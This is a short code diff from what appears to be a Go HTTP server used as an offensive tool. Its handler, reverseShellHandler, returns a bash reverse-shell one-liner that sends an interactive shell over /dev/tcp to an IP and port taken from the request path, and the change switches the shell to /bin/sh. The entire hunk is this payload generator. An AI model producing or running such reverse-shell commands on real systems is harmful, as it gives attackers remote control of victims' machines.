@@ -83,7 +83,7 @@ func makeUploadHandler(dir string) http.HandlerFunc {
 }
 
 func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintf(w, "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", r.PathValue("ip"), r.PathValue("port"))
+	fmt.Fprintf(w, "/bin/bash -c '/bin/sh -i >& /dev/tcp/%s/%s 0>&1'", r.PathValue("ip"), r.PathValue("port"))
 }
 
 func loggingMiddleware(next http.Handler) http.Handler {
